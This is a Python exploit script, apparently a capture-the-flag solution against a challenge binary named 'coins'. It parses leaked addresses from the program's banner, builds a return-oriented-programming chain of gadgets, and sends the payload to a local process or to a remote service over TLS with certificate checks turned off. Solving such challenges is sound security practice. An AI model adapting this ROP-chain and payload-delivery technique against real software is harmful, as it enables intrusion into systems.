#!/usr/bin/env python3
import re, struct, subprocess, sys, socket, argparse, time, ssl

READ_SIZE = 0xf8

OFF = {
    'croeseid':0x142e, 'daric':0x1433, 'siglos':0x1438, 'karshapana':0x143d,
    'tetradrachm':0x1442, 'stater':0x1447, 'obol':0x144c, 'lepton':0x1451,
    'aureus':0x1459, 'solidus':0x1461, 'denarius':0x1469, 'antoninianus':0x1471,
    'sestertius':0x1479, 'florin':0x1481, 'sequin':0x1489, 'tremissis':0x1491,
    'dinar':0x1499, 'dirham':0x14a1, 'scudo':0x14a9, 'thaler':0x14b1,
    'real':0x14b9, 'piloncitos':0x14c1, 'koban':0x14c9,
    'loonie':0x14d1, 'krugerrand':0x14d5, 'sovereign':0x14d9, 'drachma':0x14dd,
    'penny':0x14e1, 'nickel':0x14e5, 'dime':0x14e9,
    'quarter':0x14ed, 'cent':0x14f5, 'shilling':0x14f9,
}
# Subtractable denomination bit -> (add_coin, sub_coin, register_group)
BIT_INFO = {
    1:('daric','loonie','r9'),       9:('solidus','loonie','r9'),      17:('real','loonie','r9'),
    2:('siglos','krugerrand','r10'),10:('denarius','krugerrand','r10'),18:('piloncitos','krugerrand','r10'),
    3:('karshapana','sovereign','r11'),11:('antoninianus','sovereign','r11'),19:('koban','sovereign','r11'),
    4:('tetradrachm','drachma','r12'),12:('sestertius','drachma','r12'),
    5:('stater','penny','r13'),     13:('florin','penny','r13'),
    6:('obol','nickel','r14'),      14:('sequin','nickel','r14'),
    7:('lepton','dime','r15'),      15:('tremissis','dime','r15'),
}
FORBIDDEN_MASK = sum(1 << b for b in range(0, 24) if b not in BIT_INFO)
R11_BITS = (1 << 3) | (1 << 11) | (1 << 19)


def high_seq(h):
    seq = []
    while h >= 8:
        seq.append('thaler'); h -= 8
    if h & 4: seq.append('scudo')
    if h & 2: seq.append('dirham')
    if h & 1: seq.append('dinar')
    return seq

def direct_entries(max_cost=27):
    # A = h*0x10000 + m*0x100 + e, using the cheap r8 denominations.
    out = []
    for h in range(0, 40):
        hs = high_seq(h)
        hc = len(hs)
        for m in range(0, max_cost - hc + 1):
            for e in range(0, max_cost - hc - m + 1):
                seq = hs + ['aureus'] * m + ['croeseid'] * e
                val = h * 0x10000 + m * 0x100 + e
                out.append((val, len(seq), seq))
    # lower total cost first, then smaller overshoot tends to find compact payloads
    out.sort(key=lambda x: (x[1], x[0]))
    return out

DIRECT = direct_entries()

def represent_b(value, allow_r11, force_r11=False):
    """Return (cost, load_seq, sub_seq) for subtracting pure value via non-r8 regs.
       If r11 is used, remember the real subtraction also includes initial r11=payload_len.
    """
    if value < 0 or value >= (1 << 24):
        return None
    if value & FORBIDDEN_MASK:
        return None
    if (value & R11_BITS) and not allow_r11:
        return None
    load_seq = []
    groups = {}
    for bit, (add_coin, sub_coin, group) in BIT_INFO.items():
        if (value >> bit) & 1:
            load_seq.append(add_coin)
            groups[group] = sub_coin
    if force_r11:
        groups['r11'] = 'sovereign'
    # deterministic sub order; keep r9 later okay because dummy clear already happened at beginning
    order = ['r9','r10','r11','r12','r13','r14','r15']
    sub_seq = [groups[g] for g in order if g in groups]
    cost = len(load_seq) + len(sub_seq)
    return cost, load_seq, sub_seq

def chain_for_offset(price_off, total_read_qwords=READ_SIZE // 8):
    want = price_off - 0x1a26  # quarter loads base+0x1a26, cent adds r8
    if want < 0:
        raise ValueError(f'negative target r8 from offset {price_off:#x}')

    best = None
    for A, ca, aseq in DIRECT:
        if A < want:
            continue
        if ca > 27:
            continue
        D = A - want
        # Mode 1: no r11 subtraction, no payload-length correction.
        rep = represent_b(D, allow_r11=False, force_r11=False)
        if rep:
            cb, load, subs = rep
            exec_qwords = ca + cb + 4  # dummy carry clear + math + quarter+cent+shilling
            if exec_qwords <= total_read_qwords:
                seq = ['loonie'] + aseq + load + subs + ['quarter', 'cent', 'shilling']
                cand = (len(seq), seq, want, A, D, False)
                if best is None or cand[0] < best[0]:
                    best = cand
        # Mode 2: use sovereign, so r11 contributes the full read length.
        for cb_guess in range(1, 28 - ca + 1):
            exec_qwords = ca + cb_guess + 4
            Bpure = D - 8 * total_read_qwords
            rep = represent_b(Bpure, allow_r11=True, force_r11=True)
            if not rep:
                continue
            cb, load, subs = rep
            if cb != cb_guess:
                continue
            if exec_qwords <= total_read_qwords:
                seq = ['loonie'] + aseq + load + subs + ['quarter', 'cent', 'shilling']
                if len(seq) != exec_qwords:
                    continue
                cand = (len(seq), seq, want, A, Bpure + 8 * total_read_qwords, True)
                if best is None or cand[0] < best[0]:
                    best = cand
    if not best:
        raise ValueError(f'no chain found for want={want:#x} price_off={price_off:#x}')
    return best

def build_payload(base, price_off, total_read_qwords=READ_SIZE // 8):
    n, seq, want, A, B_eff, uses_len = chain_for_offset(price_off, total_read_qwords)
    padded_seq = seq + ['shilling'] * (total_read_qwords - len(seq))
    payload = b''.join(struct.pack('<Q', base + OFF[x]) for x in padded_seq)
    assert len(payload) == READ_SIZE
    return payload, seq, padded_seq, want, A, B_eff, uses_len

def recv_until(sock, marker=b'> ', timeout=5.0):
    sock.settimeout(timeout)
    data = b''
    while not data.endswith(marker):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data

def parse_leaks(banner):
    m1 = re.search(rb'starting balance:\s*0x([0-9a-fA-F]+)', banner)
    m2 = re.search(rb'flag price:\s*\[your_balance\] \+ 0x([0-9a-fA-F]+)', banner)
    if not (m1 and m2):
        raise ValueError('failed to parse leaks from banner')
    return int(m1.group(1), 16), int(m2.group(1), 16)

def run_local(exe, debug=False):
    p = subprocess.Popen([exe], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    banner = b''
    while not banner.endswith(b'> '):
        c = p.stdout.read(1)
        if not c:
            break
        banner += c
    base, price_off = parse_leaks(banner)
    payload, seq, padded_seq, want, A, B, uses_len = build_payload(base, price_off)
    if debug:
        sys.stderr.write(banner.decode(errors='replace'))
        sys.stderr.write(f'base={base:#x} price_off={price_off:#x} want_r8={want:#x} A={A:#x} B_eff={B:#x} uses_r11_len={uses_len} exec_qwords={len(seq)} read_qwords={len(padded_seq)}\n')
        sys.stderr.write(' -> '.join(seq) + '\n')
    p.stdin.write(payload)
    p.stdin.close()
    out = p.stdout.read()
    p.wait()
    return banner + out

def run_remote(host, port, debug=False, use_ssl=True):
    raw = socket.create_connection((host, int(port)), timeout=8)

    if use_ssl:
        # CTF infra biasanya pakai TLS seperti `ncat --ssl`, tapi sertifikatnya
        # tidak perlu/sering tidak bisa diverifikasi.
        ctx = ssl._create_unverified_context()
        s = ctx.wrap_socket(raw, server_hostname=host)
    else:
        s = raw

    banner = recv_until(s, marker=b'> ', timeout=8.0)
    base, price_off = parse_leaks(banner)
    payload, seq, padded_seq, want, A, B, uses_len = build_payload(base, price_off)
    if debug:
        sys.stderr.write(banner.decode(errors='replace'))
        sys.stderr.write(f'base={base:#x} price_off={price_off:#x} want_r8={want:#x} A={A:#x} B_eff={B:#x} uses_r11_len={uses_len} exec_qwords={len(seq)} read_qwords={len(padded_seq)} payload_len={len(payload)} ssl={use_ssl}\n')
        sys.stderr.write(' -> '.join(seq) + '\n')

    s.sendall(payload)

    out = b''
    s.settimeout(5)
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
        except (TimeoutError, socket.timeout):
            break
        except ssl.SSLError:
            break
    try:
        s.close()
    except OSError:
        pass
    return banner + out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host_or_exe', nargs='?', default='./coins')
    ap.add_argument('port', nargs='?')
    ap.add_argument('--debug', action='store_true')
    ap.add_argument('--plain', '--no-ssl', dest='plain', action='store_true', help='pakai TCP polos untuk remote non-TLS')
    args = ap.parse_args()
    if args.port:
        out = run_remote(args.host_or_exe, args.port, args.debug, use_ssl=not args.plain)
    else:
        out = run_local(args.host_or_exe, args.debug)
    sys.stdout.buffer.write(out)

if __name__ == '__main__':
    main()
